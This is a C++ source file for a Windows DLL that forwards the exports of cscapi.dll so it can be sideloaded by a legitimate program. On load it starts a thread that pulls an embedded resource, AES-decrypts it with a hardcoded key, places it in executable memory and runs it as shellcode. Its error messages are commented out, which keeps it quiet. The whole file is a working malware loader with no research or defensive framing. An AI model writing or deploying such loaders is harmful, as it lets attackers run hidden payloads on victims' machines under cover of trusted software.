#include "pch.h"
#include <windows.h>
#include <iostream>
#include <bcrypt.h>
#include "resource.h"

#pragma comment(lib, "bcrypt.lib")
#pragma comment(linker, "/export:CscNetApiGetInterface=cscapi.CscNetApiGetInterface")
#pragma comment(linker, "/export:CscSearchApiGetInterface=cscapi.CscSearchApiGetInterface")
#pragma comment(linker, "/export:OfflineFilesEnable=cscapi.CscNetApiGetInterface")
#pragma comment(linker, "/export:OfflineFilesGetShareCachingMode=cscapi.OfflineFilesGetShareCachingMode")
#pragma comment(linker, "/export:OfflineFilesQueryStatus=cscapi.OfflineFilesQueryStatus")
#pragma comment(linker, "/export:OfflineFilesQueryStatusEx=cscapi.OfflineFilesQueryStatusEx")
#pragma comment(linker, "/export:OfflineFilesStart=cscapi.OfflineFilesStart")


static const BYTE keyss[] = { 0x4b,0x44,0x42,0x4d,0x01,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x68,0x65,0x6c,0x6c,0x6f,0x69,0x73,0x73,0x73,0x73,0x73,0x73,0x73,0x73,0x73,0x73 };

BOOL decrypt(LPBYTE shellcode, DWORD shellcodeLen) {
    BCRYPT_ALG_HANDLE phalgorithm;
    LPCWSTR pszImplementation = NULL;
    BCryptOpenAlgorithmProvider(&phalgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(phalgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    NTSTATUS status;
    BCRYPT_KEY_HANDLE phkey;
    DWORD pboutput;
    ULONG pcbresult;

    PVOID shell = VirtualAlloc(NULL, shellcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!shell) return 1;

    memcpy(shell, shellcode, shellcodeLen);
    if ((status = BCryptGetProperty(phalgorithm, BCRYPT_OBJECT_LENGTH, (PUCHAR)&pboutput, sizeof(DWORD), &pcbresult, 0)) != 0) {
        //printf("[+] Error Occured while Getting Key property of Algorithm: %X\n", status);
        exit(0);
    }

    LPVOID heapmemory_key_import = HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS, pboutput);

    if ((status = BCryptImportKey(phalgorithm, NULL, BCRYPT_KEY_DATA_BLOB, &phkey, (PUCHAR)heapmemory_key_import, pboutput, (PUCHAR)keyss, sizeof(keyss), 0)) != 0) {
        //printf("[+] Error Occured while Importing Key: %X\n", status);
        exit(0);
    }


    LPVOID heapmemory_buf = HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS, shellcodeLen);
    ULONG decrypted_size;

    if ((status = BCryptDecrypt(phkey, (PUCHAR)heapmemory_buf, shellcodeLen, NULL, NULL, 0, NULL, 0, &decrypted_size, BCRYPT_BLOCK_PADDING)) != 0) {
        //printf("[+] Error: %X\n", status);
        exit(0);
    }

    ULONG pcbresult_decrypt_new;

    if ((status = BCryptDecrypt(phkey, (PUCHAR)shell, shellcodeLen, NULL, NULL, 0, (PUCHAR)shell, decrypted_size, &pcbresult_decrypt_new, BCRYPT_BLOCK_PADDING)) != 0) {
        //printf("[+] Error: %X\n", status);
        exit(0);
    }

 
    ((void(*)())shell)();

    return 1;

}

DWORD WINAPI shell(LPVOID lpParam) {

    HMODULE hMod = (HMODULE)lpParam;

    HRSRC hRsrc = FindResourceW(hMod, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
    if (!hRsrc) return 1;

    HGLOBAL hGRsrc = LoadResource(hMod, hRsrc);
    if (!hGRsrc) return 1;

    PVOID pData = LockResource(hGRsrc);
    if (!pData) return 1;

    DWORD dwSize = SizeofResource(hMod, hRsrc);


    if (!decrypt((LPBYTE)pData, dwSize)) {
        return 1;
    }
  

}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    HANDLE threadhandle;
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        threadhandle = CreateThread(NULL, 0, shell, hModule, 0, NULL);
        CloseHandle(threadhandle);
    }
    return TRUE;
}
